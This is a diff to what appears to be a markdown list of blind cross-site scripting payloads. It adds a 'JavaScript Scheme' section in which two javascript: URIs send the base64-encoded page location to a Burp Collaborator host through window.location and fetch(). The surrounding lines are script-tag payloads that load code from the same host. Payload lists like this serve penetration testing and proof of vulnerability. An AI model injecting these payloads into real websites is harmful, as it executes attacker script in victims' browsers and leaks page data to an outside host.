@@ -50,3 +50,10 @@ The following list includes some blind XSS payloads that can be used to proof ev
 '"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>
 '"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>
 ```
+
+## JavaScript Scheme
+```
+javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)
+
+javascript:fetch("https://example.burpcollaborator.net/js-scheme-fetch?"+btoa(document.location))
+```
